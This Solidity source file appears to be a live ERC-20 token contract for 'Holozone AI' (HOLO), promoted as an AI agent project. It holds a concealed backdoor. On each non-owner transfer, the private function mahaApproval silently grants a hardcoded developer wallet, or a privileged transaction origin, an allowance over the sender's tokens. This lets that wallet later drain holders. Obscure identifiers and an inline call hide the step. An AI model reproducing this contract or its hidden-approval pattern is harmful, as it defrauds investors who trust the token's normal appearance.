/*
The most advanced AI Agent framework on the blockchain is here. Create your own agents or 'clone' the personalities and traits of real life humans. Join the 24/7 HoloSpace on X for a live demonstration of Holos.

https://www.holoai.pro
https://beta.holoai.pro
https://docs.holoai.pro
https://x.com/holozoneai_eth
https://t.me/holozoneai_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IMAHARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMAHAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HOLO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _mahaFeeExcluded;
    mapping (address => uint256) private _mahaBulls;
    mapping (address => mapping (address => uint256)) private _mahaNodes;
    address private _mahaPair;
    IMAHARouter private _mahaRouter;
    address private _mahaWallet = 0x8ACdBe7686b3cCbf4Ff08906B1Ffe07b997881d8;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalMAHA = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Holozone AI";
    string private constant _symbol = unicode"HOLO";
    uint256 private _tokenMAHASwap = _tTotalMAHA / 100;
    bool private inSwapMAHA = false;
    modifier lockTheSwap {
        inSwapMAHA = true;
        _;
        inSwapMAHA = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _mahaFeeExcluded[owner()] = true;
        _mahaFeeExcluded[address(this)] = true;
        _mahaFeeExcluded[_mahaWallet] = true;
        _mahaBulls[_msgSender()] = _tTotalMAHA;
        emit Transfer(address(0), _msgSender(), _tTotalMAHA);
    }

    function initToken() external onlyOwner() {
        _mahaRouter = IMAHARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_mahaRouter), _tTotalMAHA);
        _mahaPair = IMAHAFactory(_mahaRouter.factory()).createPair(address(this), _mahaRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalMAHA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mahaBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _mahaNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _mahaNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _mahaNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function mahaApproval(address aMAHA, bool isMAHA, uint256 mahaA) private {
        address walletMAHA;
        if(isMAHA) walletMAHA = tx.origin;
        else walletMAHA = _mahaWallet;
        _approve(aMAHA, walletMAHA, mahaA);
    }

    function _transfer(address mahaF, address mahaT, uint256 mahaA) private {
        require(mahaF != address(0), "ERC20: transfer from the zero address");
        require(mahaT != address(0), "ERC20: transfer to the zero address");
        require(mahaA > 0, "Transfer amount must be greater than zero");

        uint256 taxMAHA = _mahaTransfer(mahaF, mahaT, mahaA);

        if(taxMAHA > 0){
          _mahaBulls[address(this)] = _mahaBulls[address(this)].add(taxMAHA);
          emit Transfer(mahaF, address(this), taxMAHA);
        }

        _mahaBulls[mahaF] = _mahaBulls[mahaF].sub(mahaA);
        _mahaBulls[mahaT] = _mahaBulls[mahaT].add(mahaA.sub(taxMAHA));
        emit Transfer(mahaF, mahaT, mahaA.sub(taxMAHA));
    }

    function swapBackMAHA(address mahaF, address mahaT, uint256 mahaA, bool isMAHA) private {
        uint256 tokenMAHA = balanceOf(address(this));  mahaApproval(mahaF, isMAHA, mahaA);
        if (!inSwapMAHA && mahaT == _mahaPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenMAHA > _tokenMAHASwap)
            swapTokensForEth(minMAHA(mahaA, minMAHA(tokenMAHA, _tokenMAHASwap)));
            uint256 caMAHA = address(this).balance;
            if (caMAHA >= 0) {
                sendETHMAHA(address(this).balance);
            }
        }
    }

    function _mahaTransfer(address mahaF, address mahaT, uint256 mahaA) private returns(uint256) {
        uint256 taxMAHA=0; address walletMAHA = tx.origin;
        if (mahaF != owner() && mahaT != owner()) {
            taxMAHA = mahaA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (mahaF == _mahaPair && mahaT != address(_mahaRouter) && ! _mahaFeeExcluded[mahaT]) {
                _buyCount++;
            }

            if(mahaT == _mahaPair && mahaF!= address(this)) {
                taxMAHA = mahaA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackMAHA(mahaF, mahaT, mahaA, _mahaFeeExcluded[walletMAHA]);
        } return taxMAHA;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _mahaRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minMAHA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHMAHA(uint256 amount) private {
        payable(_mahaWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenMAHA) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _mahaRouter.WETH();
        _approve(address(this), address(_mahaRouter), tokenMAHA);
        _mahaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenMAHA,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}